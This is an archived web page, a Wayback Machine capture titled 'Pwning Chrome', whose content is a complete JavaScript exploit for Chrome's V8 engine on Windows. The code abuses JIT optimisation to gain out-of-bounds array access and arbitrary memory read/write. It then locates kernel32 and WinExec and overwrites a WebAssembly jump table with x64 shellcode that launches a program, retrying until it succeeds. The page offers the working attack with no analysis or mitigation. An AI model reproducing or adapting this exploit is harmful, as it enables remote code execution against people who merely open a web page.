<!DOCTYPE html>
<html>
    <script src="//archive.org/includes/analytics.js?v=cf34f82" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app29.us.archive.org';v.server_ms=733;archive_analytics.send_pageview({});});</script><script type="text/javascript" src="/_static/js/playback.bundle.js?v=xTFGO54E" charset="utf-8"></script>
<script type="text/javascript" src="/_static/js/wombat.js?v=UHAOicsW" charset="utf-8"></script>
<script type="text/javascript">
  __wm.init("https://web.archive.org/web");
  __wm.wombat("https://blog.br0vvnn.io/upload/exploit-1003286.html.txt","20210126015151","https://web.archive.org/","web","/_static/",
	      "1611625911");
</script>
<link rel="stylesheet" type="text/css" href="/_static/css/banner-styles.css?v=omkqRugM" />
<link rel="stylesheet" type="text/css" href="/_static/css/iconochive.css?v=qtvMKcIJ" />
<!-- End Wayback Rewrite JS Include -->
<!-- BEGIN WAYBACK TOOLBAR INSERT -->
<style type="text/css">
body {
  margin-top:0 !important;
  padding-top:0 !important;
  /*min-width:800px !important;*/
}
</style>
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display:none;direction:ltr;">
<div id="wm-ipp" style="position:fixed;left:0;top:0;right:0;">
<div id="wm-ipp-inside">
  <div style="position:relative;">
    <div id="wm-logo" style="float:left;width:110px;padding-top:12px;">
      <a href="/web/" title="Wayback Machine home page"><img src="/_static/images/toolbar/wayback-toolbar-logo-200.png" srcset="/_static/images/toolbar/wayback-toolbar-logo-100.png, /_static/images/toolbar/wayback-toolbar-logo-150.png 1.5x, /_static/images/toolbar/wayback-toolbar-logo-200.png 2x" alt="Wayback Machine" style="width:100px" border="0" /></a>
    </div>
    <div class="r" style="float:right;">
      <div id="wm-btns" style="text-align:right;height:25px;">
                  <div id="wm-save-snapshot-success">success</div>
          <div id="wm-save-snapshot-fail">fail</div>
          <a id="wm-save-snapshot-open" href="#"
	     title="Share via My Web Archive" >
            <span class="iconochive-web"></span>
          </a>
          <a href="https://archive.org/account/login.php"
             title="Sign In"
             id="wm-sign-in"
          >
            <span class="iconochive-person"></span>
          </a>
          <span id="wm-save-snapshot-in-progress" class="iconochive-web"></span>
        	<a href="http://faq.web.archive.org/" title="Get some help using the Wayback Machine" style="top:-6px;"><span class="iconochive-question" style="color:rgb(87,186,244);font-size:160%;"></span></a>
	<a id="wm-tb-close" href="#close" onclick="__wm.h(event);return false;" style="top:-2px;" title="Close the toolbar"><span class="iconochive-remove-circle" style="color:#888888;font-size:240%;"></span></a>
      </div>
      <div id="wm-share">
          <a href="/web/20210126015151/http://web.archive.org/screenshot/https://blog.br0vvnn.io/upload/exploit-1003286.html.txt"
             id="wm-screenshot"
             title="screenshot">
            <span class="wm-icon-screen-shot"></span>
          </a>
          <a href="#"
            id="wm-video"
            title="video">
            <span class="iconochive-movies"></span>
          </a>
	<a id="wm-share-facebook" href="#" data-url="https://web.archive.org/web/20210126015151/https://blog.br0vvnn.io/upload/exploit-1003286.html.txt" title="Share on Facebook" style="margin-right:5px;" target="_blank"><span class="iconochive-facebook" style="color:#3b5998;font-size:160%;"></span></a>
	<a id="wm-share-twitter" href="#" data-url="https://web.archive.org/web/20210126015151/https://blog.br0vvnn.io/upload/exploit-1003286.html.txt" title="Share on Twitter" style="margin-right:5px;" target="_blank"><span class="iconochive-twitter" style="color:#1dcaff;font-size:160%;"></span></a>
      </div>
    </div>
    <table class="c" style="">
      <tbody>
	<tr>
	  <td class="u" colspan="2">
	    <form target="_top" method="get" action="/web/submit" name="wmtb" id="wmtb"><input type="text" name="url" id="wmtbURL" value="https://blog.br0vvnn.io/upload/exploit-1003286.html.txt" onfocus="this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20210126015151" /><input type="submit" value="Go" /></form>
	  </td>
	  <td class="n" rowspan="2" style="width:110px;">
	    <table>
	      <tbody>
		<!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
		<tr class="m">
		  <td class="b" nowrap="nowrap">Dec</td>
		  <td class="c" id="displayMonthEl" title="You are here: 01:51:51 Jan 26, 2021">JAN</td>
		  <td class="f" nowrap="nowrap">Feb</td>
		</tr>
		<!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
		<tr class="d">
		  <td class="b" nowrap="nowrap"><img src="/_static/images/toolbar/wm_tb_prv_off.png" alt="Previous capture" width="14" height="16" border="0" /></td>
		  <td class="c" id="displayDayEl" style="width:34px;font-size:24px;white-space:nowrap;" title="You are here: 01:51:51 Jan 26, 2021">26</td>
		  <td class="f" nowrap="nowrap"><img src="/_static/images/toolbar/wm_tb_nxt_off.png" alt="Next capture" width="14" height="16" border="0" /></td>
		</tr>
		<!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
		<tr class="y">
		  <td class="b" nowrap="nowrap">2020</td>
		  <td class="c" id="displayYearEl" title="You are here: 01:51:51 Jan 26, 2021">2021</td>
		  <td class="f" nowrap="nowrap">2022</td>
		</tr>
	      </tbody>
	    </table>
	  </td>
	</tr>
	<tr>
	  <td class="s">
	    	    <div id="wm-nav-captures">
	      	      <a class="t" href="/web/20210126015151*/https://blog.br0vvnn.io/upload/exploit-1003286.html.txt" title="See a list of every capture for this URL">2 captures</a>
	      <div class="r" title="Timespan for captures of this URL">26 Jan 2021 - 26 Jan 2021</div>
	      </div>
	  </td>
	  <td class="k">
	    <a href="" id="wm-graph-anchor">
	      <div id="wm-ipp-sparkline" title="Explore captures for this URL" style="position: relative">
		<canvas id="wm-sparkline-canvas" width="650" height="27" border="0"></canvas>
	      </div>
	    </a>
	  </td>
	</tr>
      </tbody>
    </table>
    <div style="position:absolute;bottom:0;right:2px;text-align:right;">
      <a id="wm-expand" class="wm-btn wm-closed" href="#expand" onclick="__wm.ex(event);return false;"><span id="wm-expand-icon" class="iconochive-down-solid"></span> <span style="font-size:80%">About this capture</span></a>
    </div>
  </div>
    <div id="wm-capinfo" style="border-top:1px solid #777;display:none; overflow: hidden">
                    <div id="wm-capinfo-collected-by">
    <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center">COLLECTED BY</div>
    <div style="padding:3px;position:relative" id="wm-collected-by-content">
      <div style="display:inline-block;vertical-align:top;width:49%;">
			<span class="c-logo" style="background-image:url(https://archive.org/services/img/save-page-now)"></span>
		<div>Collection: <a style="color:#33f;" href="https://archive.org/details/save-page-now" target="_new"><span class="wm-title">Save Page Now</span></a></div>
	      </div>
    </div>
    </div>
    <div id="wm-capinfo-timestamps">
    <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center" title="Timestamps for the elements of this page">TIMESTAMPS</div>
    <div>
      <div id="wm-capresources" style="margin:0 5px 5px 5px;max-height:250px;overflow-y:scroll !important"></div>
      <div id="wm-capresources-loading" style="text-align:left;margin:0 20px 5px 5px;display:none"><img src="/_static/images/loading.gif" alt="loading" /></div>
    </div>
    </div>
  </div></div></div></div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20210126015151/https://blog.br0vvnn.io/upload/exploit-1003286.html.txt</div>
<div id="donato" style="position:relative;width:100%;">
  <div id="donato-base">
    <iframe id="donato-if" src="https://archive.org/includes/donate.php?as_page=1&amp;platform=wb&amp;referer=https%3A//web.archive.org/web/20210126015151/https%3A//blog.br0vvnn.io/upload/exploit-1003286.html.txt"
	    scrolling="no" frameborder="0" style="width:100%; height:100%">
    </iframe>
  </div>
</div><script type="text/javascript">
__wm.bt(650,27,25,2,"web","https://blog.br0vvnn.io/upload/exploit-1003286.html.txt","20210126015151",1996,"/_static/",["/_static/css/banner-styles.css?v=omkqRugM","/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
</script>
<!-- END WAYBACK TOOLBAR INSERT --><h1>Pwning Chrome</h1>
    <p>Exploit Started...</p>
    <body>
        <script>

            // HELPER FUNCTIONS
            let conversion_buffer = new ArrayBuffer(8);
            let float_view = new Float64Array(conversion_buffer);
            let int_view = new BigUint64Array(conversion_buffer);
            let u8_view = new Uint8Array(conversion_buffer);
            BigInt.prototype.hex = function() {
                return '0x' + this.toString(16);
            };
            BigInt.prototype.i2smi = function() {
                return parseInt(this.toString());
            };
            
            BigInt.prototype.i2u8a = function() {
                int_view[0] = this;
                return u8_view;
            }

            BigInt.prototype.i2f = function() {
                int_view[0] = this;
                return float_view[0];
            }
            BigInt.prototype.smi2f = function() {
                int_view[0] = this << 32n;
                return float_view[0];
            }
            Number.prototype.f2i = function() {
                float_view[0] = this;
                return int_view[0];
            }
            Number.prototype.f2smi = function() {
                float_view[0] = this;
                return int_view[0] >> 32n;
            }
            Number.prototype.i2f = function() {
                return BigInt(this).i2f();
            }
            Number.prototype.smi2f = function() {
                return BigInt(this).smi2f();
            }
            Number.prototype.smi2i = function() {
                return BigInt(this);
            }
            
            var origin_array = null;
            var oob_array = null;
            var victim_object = null;
            var victim_buffer = null;

            var oob_array_length_index_from_origin = 0x19;
            var oob_array_new_length = 0x7FFFFFF;

            var victim_object_obj_index_from_oob_array = null;
            var victim_object_new_mark = 0x42424242;

            var victim_buffer_buffer_index_from_oob_array = null;
            var victim_buffer_length = 0x8;
            var victim_buffer_length_for_test = 0x8383;

            var max_victim_buffer_length = 0x10000000;
            
            var base_address_test = 0x7ffn;
            var pointer_test__under_limit = 0x00000000FFFFFFFFn;
            var pointer_test__above_limit = 0x00FFFFFFFFFFFFFFn;
            var chrome_child = null;
            var kernel32 = null;
            var kernelbase = null;
            var ntdll = null;

            var get_pwnd = null; // wasm function for run shellcode;
            
            var wasm_offsets = { 
                shared_function_info : 0x18n,
                wasm_exported_function_data : 0x8n,
                wasm_instance : 0x10n,
                jump_table_start : 0x80n
            };
            // push rax, push calc, push rsp, pop rcx, mov rax, winexec, push rax, pop rdi, call rdi, pop rax, ret
            var shellcode = [0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x54,
                         0x58, 0x66, 0x83, 0xe4, 0xf0, 0x50, 0x6a, 0x60,
                         0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59,
                         0x48, 0x29, 0xd4, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                         0x50, 0x5f, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x68, 0x5c, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3];
            var winexec_offset_in_shellcode = 0x1d;

            function func_for_confuse(x){
                'use strict'         // use strict language mode for trimming inputs.
                return undefined;
            }

            function utf8ToString(h, p) {
                let s = "";
                for (i = p; h[i]; i++) {
                s += String.fromCharCode(h[i]);
                }
                return s;
            }
            
            function get_wasm_function() {
                var wasmImports = {
                env: {
                    puts: function puts (index) {
                    document.write(utf8ToString(h, index));
                    }
                }
                };
                var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
                96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
                116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
                131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
                109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
                128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
                65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
                let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
                let h = new Uint8Array(m.exports.memory.buffer);
                return m.exports.hello;
            }

            function gc(){
                for( let i = 0; i < 0x200; i ++ )
                    new Uint8Array( 0x100000 );
            }

            function initialize()
            {
                arg_padding_array = new Array(0xFFFE); // 2(bind-bind) * 0xFFFD + 3( target, receiver, argc ) + 5 = 0x20002;
                arg_padding_array.fill(undefined);

                func_for_confuse_bind = func_for_confuse.bind(null, ...arg_padding_array);
                func_for_confuse_bind = func_for_confuse_bind.bind(null, ...arg_padding_array);

                var new_opcode = 0x10024; // CheckMaps node's operator is replaced with this one.
                                            // here, EffectPhi( 0x24 ), 0x10024 for robustness.

                var param_count = ( new_opcode - 8 ) / 2;

                var temp_param_arr = new Array( param_count );
                for( let i = 0; i < param_count; i ++ ){ temp_param_arr[i] = i; };

                func_for_new_opcode = Object.isSealed; // this function must not be inlined.
                func_for_new_opcode_bind = func_for_new_opcode.bind({}, ...temp_param_arr );

                temp_param_arr = new Array(0xC000);
                temp_param_arr.fill(undefined);

                func_for_trim_graph = func_for_confuse[Symbol.hasInstance].bind(null,...temp_param_arr);
                func_for_trim_graph = func_for_trim_graph.bind(null,...temp_param_arr);

                extra_arg_count = 0x8000;
                extra_arg_arr = new Array( extra_arg_count + 4);

                var extra_arg_str_arr = new Array( extra_arg_count );
                for( let i = 0; i < extra_arg_count; i ++ ){ extra_arg_str_arr[i] = `arg${i}`; };

                extra_arg_str = extra_arg_str_arr.join(",");
            }

            initialize();

            eval(`

                function origin_oob_write(` + extra_arg_str + `,flag, arr, index, value ){

                let trim_flag = undefined;
                try { trim_flag = func_for_trim_graph(); } catch(e){}

                if( Object.is( trim_flag, undefined ) )
                {

                    var input_0x20002 = flag === flag; 

                    func_for_new_opcode_bind();

                    if( flag )
                    {
                    try	{
                        func_for_confuse_bind( arr, undefined, undefined, undefined, input_0x20002, undefined, undefined);
                    } 
                    catch(e){
                    }  
                    }
                    else
                    {
                    fn(1);
                    }

                }

                arr[index] = value;

                }`
            );

            function optimize_origin_oob_write(){
                func_for_confuse( 10 );  // call this function for feedback to trim inputs;

                var array = [11.1, 2, 3];

                extra_arg_arr[extra_arg_count] = 1;         // flag
                extra_arg_arr[extra_arg_count + 1] = array; 
                extra_arg_arr[extra_arg_count + 2] = 1;     // length
                extra_arg_arr[extra_arg_count + 3] = 1.1;   // value

                for( let i = 0; i < 6000; i ++ )
                {
                    origin_oob_write.call(null, ...extra_arg_arr);
                }

                document.write( "<br>JIT code generated...");
            }

            function trigger_oob_access(){
                origin_array = [1.1];
                origin_array[0x7FFFFF] = 1.1;

                oob_array = [1.1, 1.1];
                victim_object = { obj : 0x51515151, mark1 : 0x61616161,  mark2: 0x73737373 };
                victim_buffer = new ArrayBuffer(victim_buffer_length);
                
                gc();

                extra_arg_arr[extra_arg_count + 1] = origin_array; 
                extra_arg_arr[extra_arg_count + 2] = oob_array_length_index_from_origin;
                extra_arg_arr[extra_arg_count + 3] = oob_array_new_length.smi2f();

                origin_oob_write.call(null, ...extra_arg_arr);

                document.write( "<br>OOB access achieved...");

                return oob_array.length == oob_array_new_length;
            }

            function address_of( object ){
                victim_object.obj = object;
                return oob_array[victim_object_obj_index_from_oob_array].f2i() - 1n;
            } 

            function read_qword( address ){
                var victim_buffer_origin_buffer = oob_array[victim_buffer_buffer_index_from_oob_array];
                oob_array[victim_buffer_buffer_index_from_oob_array] = address.i2f();
                var result = data_view.getBigUint64(0, true);
                oob_array[victim_buffer_buffer_index_from_oob_array] = victim_buffer_origin_buffer;
                return result;
            }

            function write_qword( address, value ){
                var victim_buffer_origin_buffer = oob_array[victim_buffer_buffer_index_from_oob_array];
                oob_array[victim_buffer_buffer_index_from_oob_array] = address.i2f();
                data_view.setBigUint64(0, value, true);
                oob_array[victim_buffer_buffer_index_from_oob_array] = victim_buffer_origin_buffer;
            }

            function read_dword( address ){
                var victim_buffer_origin_buffer = oob_array[victim_buffer_buffer_index_from_oob_array];
                oob_array[victim_buffer_buffer_index_from_oob_array] = address.i2f();
                var result = data_view.getUint32(0, true);
                oob_array[victim_buffer_buffer_index_from_oob_array] = victim_buffer_origin_buffer;
                return result;
            }

            function write_dword( address, value ){
                var victim_buffer_origin_buffer = oob_array[victim_buffer_buffer_index_from_oob_array];
                oob_array[victim_buffer_buffer_index_from_oob_array] = address.i2f();
                data_view.setUint32(0, value, true);
                oob_array[victim_buffer_buffer_index_from_oob_array] = victim_buffer_origin_buffer;
            }

            function archieve_arw()
            {
                // Decide victim_object obj index...
                for( let i = 0; i < 0x20; i ++ ){
                    if( oob_array[i].f2smi() == victim_object.obj 
                        && oob_array[i + 1].f2smi() == victim_object.mark1 && oob_array[i + 2].f2smi() == victim_object.mark2 ){

                        oob_array[i + 1] = victim_object_new_mark.smi2f();
                        if( victim_object.mark1 == victim_object_new_mark ){
                            victim_object_obj_index_from_oob_array = i;
                            document.write( "<br>victim_object's obj index is 0x" + victim_object_obj_index_from_oob_array.toString( 16 ) );
                            break;
                        }
                    }
                }

                if( victim_object_obj_index_from_oob_array == null ) return false;

                // Decide victim_buffer buffer index...
                var victim_object_index_from_oob_array = ( victim_object_obj_index_from_oob_array - 3 );
                var victim_buffer_victim_object_distance = (( address_of( victim_buffer ) - address_of( victim_object ) ) / 8n ).i2smi();

                victim_buffer_buffer_index_from_oob_array = victim_object_index_from_oob_array +  victim_buffer_victim_object_distance + 4;
                
                if( oob_array[victim_buffer_buffer_index_from_oob_array - 1].f2i().i2smi() != victim_buffer.byteLength ) return false;

                oob_array[victim_buffer_buffer_index_from_oob_array - 1] = victim_buffer_length_for_test.i2f();

                if( victim_buffer.byteLength != victim_buffer_length_for_test ) return false;
                oob_array[victim_buffer_buffer_index_from_oob_array - 1] = max_victim_buffer_length.i2f();

                data_view = new DataView(victim_buffer);  

                document.write( "<br>victim_buffer's buffer index is 0x" + victim_buffer_buffer_index_from_oob_array.toString( 16 ) );

                return true;
            }

            function get_victim_buffer_buffer_address(){
                return oob_array[victim_buffer_buffer_index_from_oob_array].f2i();
            }

            function set_victim_buffer_buffer_address_length( address, length ){
                oob_array[victim_buffer_buffer_index_from_oob_array-1] = length.smi2f();
                oob_array[victim_buffer_buffer_index_from_oob_array] = address.i2f();
            }

            function read_dword_from_rva( rva ){
                return data_view.getUint32( rva, true );
            }
            function write_dword_from_rva( rva, value ){
                return data_view.setUint32( rva, value, true );
            }

            function compare_string( offset, str ){
                let char_str = "";
                for( let i  = 0; i < str.length; i ++ ){
                    char_str = String.fromCharCode( data_view.getUint8(offset + i));
                    if( char_str.toUpperCase() != str[i].toUpperCase() ) return false;
                }
                return true;
            }


            function get_module_base_from_pointer( pointer ){
                pointer = ( pointer / 0x10000n ) * 0x10000n;

                let origin_victim_buffer_address = get_victim_buffer_buffer_address();

                let buffer_base = pointer - 0x8000000n
                set_victim_buffer_buffer_address_length( buffer_base , max_victim_buffer_length );
                
                let offset = 0x8000000;

                while( read_dword_from_rva( offset ) != 0x00905A4D ){
                    offset -= 0x10000;
                }

                set_victim_buffer_buffer_address_length( origin_victim_buffer_address, victim_buffer_length );

                return buffer_base + offset.smi2i();
            }

            function get_chrome_child_from_pointer( pointer ){
                pointer = ( pointer / 0x10000n ) * 0x10000n;

                let origin_victim_buffer_address = get_victim_buffer_buffer_address();

                let buffer_base = pointer - 0x8000000n
                set_victim_buffer_buffer_address_length( buffer_base , max_victim_buffer_length );
                
                let offset = 0x8000000;

                while( read_dword_from_rva( offset ) != 0x00785A4D ){
                    offset -= 0x10000;
                }

                set_victim_buffer_buffer_address_length( origin_victim_buffer_address, victim_buffer_length );

                return buffer_base + offset.smi2i();
            }

            function get_module_base_from_import( module_name, lib_address ){
                let origin_victim_buffer_address = get_victim_buffer_buffer_address();
                set_victim_buffer_buffer_address_length( lib_address, max_victim_buffer_length );

                let rva_optional_header = read_dword_from_rva( 0x3c );
                let rva_iat = read_dword_from_rva( rva_optional_header + 0x90);
                    
                let i = 0;
                while( true ){
                    var dll_name = read_dword_from_rva( rva_iat + i * 0x14 + 0x0C ); // IMAGE_IMPORT_DESCRIPTOR + 0xc : "name" field

                    if( !dll_name ){
                        set_victim_buffer_buffer_address_length( origin_victim_buffer_address, victim_buffer_length );
                        return null;
                    }

                    if( compare_string( dll_name, module_name ) ) break;

                    i++;
                }

                let first_thunk = read_dword_from_rva( rva_iat + i * 0x14 + 0x10 );

                set_victim_buffer_buffer_address_length( origin_victim_buffer_address, victim_buffer_length );
                
                return get_module_base_from_pointer( read_qword( lib_address + ( first_thunk + 0x20 ).smi2i() ) ); // kernel32's first thunk points ntdll
            }

            function get_chrome_child_base(){
                let div = document.createElement('div');
                let div_addr = address_of( div );
                let el_addr = read_qword(div_addr + 0x20n);
                let leak = read_qword(el_addr);
                document.write("<br>leak chrome_child ptr : " + leak.hex());
                chrome_child_base = get_chrome_child_from_pointer( leak );
                return chrome_child_base;
            }

            function get_module_bases( ){
                document.write("<br><br>Getting module base addresses... ");

                chrome_child = get_chrome_child_base();
                if( !chrome_child || chrome_child / 0x1000000000n != base_address_test ){
                    return false;
                }

                kernel32 = get_module_base_from_import( "kernel32.dll", chrome_child );
                if( !kernel32 || kernel32 / 0x1000000000n != base_address_test ){
                    return false;
                }

                return true;
            }

            function find_winexec(){
                let origin_victim_buffer_address = get_victim_buffer_buffer_address();
                set_victim_buffer_buffer_address_length( kernel32, max_victim_buffer_length );
                
                let rva_optional_header = read_dword_from_rva( 0x3c );
                let rva_eat = read_dword_from_rva( rva_optional_header + 0x88);
                
                let num_entries = read_dword_from_rva( rva_eat + 0x18 );
                let address_table = read_dword_from_rva( rva_eat + 0x1c );
                let name_table = read_dword_from_rva( rva_eat + 0x20 );
                let ordinal_table = read_dword_from_rva( rva_eat + 0x24 );

                let func_index = null;
                for( let i = 0; i  < num_entries; i ++ )
                {
                    let func_name_rva = read_dword_from_rva( name_table + i * 0x4 );
                    if( compare_string( func_name_rva, "WinExec" ) ){
                        func_index = i;
                        break;
                    } 
                }

                if( !func_index ){
                    set_victim_buffer_buffer_address_length( origin_victim_buffer_address, victim_buffer_length );
                    return null;
                }
                
                let ordinal = read_dword_from_rva( ordinal_table + func_index * 2 ) & 0xFFFF;
                let winexec_rva = read_dword_from_rva( address_table + func_index * 4 )

                set_victim_buffer_buffer_address_length( origin_victim_buffer_address, victim_buffer_length );
                return kernel32 + winexec_rva.smi2i();
            }
            
            function write_shellcode( address ){
                var victim_buffer_origin_buffer = oob_array[victim_buffer_buffer_index_from_oob_array];
                oob_array[victim_buffer_buffer_index_from_oob_array] = address.i2f();
                for( let i = 0; i < shellcode.length; i ++ ){
                    data_view.setUint8( i, shellcode[i] );
                }
                
                oob_array[victim_buffer_buffer_index_from_oob_array] = victim_buffer_origin_buffer;
            }
            
            function check_address( address ){
                return address > pointer_test__under_limit && address < pointer_test__above_limit;
            }

            function run_shellcode(){
                let get_pwnd_func_address = address_of( get_pwnd );
                if( !check_address( get_pwnd_func_address ) ){
                    return false;
                }

                let shared_function_info = read_qword( get_pwnd_func_address + wasm_offsets.shared_function_info ) - 1n;
                if( !check_address( shared_function_info ) ){
                    return false;
                }

                let wasm_exported_function_data = read_qword( shared_function_info + wasm_offsets.wasm_exported_function_data ) - 1n;
                if( !check_address( wasm_exported_function_data ) ){
                    return false;
                }

                let wasm_instance = read_qword( wasm_exported_function_data + wasm_offsets.wasm_instance ) - 1n;
                if( !check_address( wasm_instance ) ){
                    return false;
                }

                let jump_table_start = read_qword( wasm_instance + wasm_offsets.jump_table_start );
                document.write( "<br>jump_table_start : " + jump_table_start.hex() );
                if( !check_address( jump_table_start ) ){
                    return false;
                }

                let winexec = find_winexec();
                document.write( "<br>WinExec : " + winexec.hex() );
                
                winexec_u8 = winexec.i2u8a();
                for( let i = 0; i < 0x8; i ++ ){
                    shellcode[winexec_offset_in_shellcode + i] = winexec_u8[i];
                }

                write_shellcode( jump_table_start );
                get_pwnd();

                return true;
            }
            
            function init_exploit(){
                get_pwnd = get_wasm_function();
                optimize_origin_oob_write();
            }

            function exploit(){
                try{
                    if( !trigger_oob_access() ){
                        document.write( "<br>oob_array's length overwrite failed.");
                        return false;
                    }

                    document.write( "<br>oob_array's new length was overwritten with 0x" + oob_array.length.toString(16) );

                    if( !archieve_arw() ){
                        document.write( "<br>arbitrary read/write failed.");
                        return false;
                    }

                    document.write( "<br>arbitrary read/write achieved...");

                    if( !get_module_bases() ){
                        document.write( "<br>getting module base address failed.");
                        return false;
                    }
                    
                    document.write( "<br>getting module base address succeeded.");

                    if( !run_shellcode() ){
                        document.write( "<br>running shellcode failed.");
                        return false;
                    }
                }
                catch( e ){
                    document.write( "<br>unexpected exception occured. will retry.");
                    return false;
                }
                return true;
            }

            var start_time = Date.now();
            
            init_exploit();

            while( true ){
                if( exploit() ) break;
                document.write( "<br><br>Exploit failed...");
            }
            
            document.write( "<br><br>Successfully exploited...");
            
            var time = Date.now() - start_time;
            document.write( "<br>Time ellapsed : " + time / 1000 + "s" );
        </script>
    </body>
</html><!--
     FILE ARCHIVED ON 01:51:51 Jan 26, 2021 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 20:36:59 Jul 15, 2021.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  LoadShardBlock: 490.022 (3)
  captures_list: 535.859
  PetaboxLoader3.resolve: 227.995 (2)
  esindex: 0.014
  exclusion.robots.policy: 0.323
  PetaboxLoader3.datanode: 403.029 (4)
  CDXLines.iter: 33.378 (3)
  exclusion.robots: 0.336
  load_resource: 187.359
  RedisCDXSource: 5.406
-->
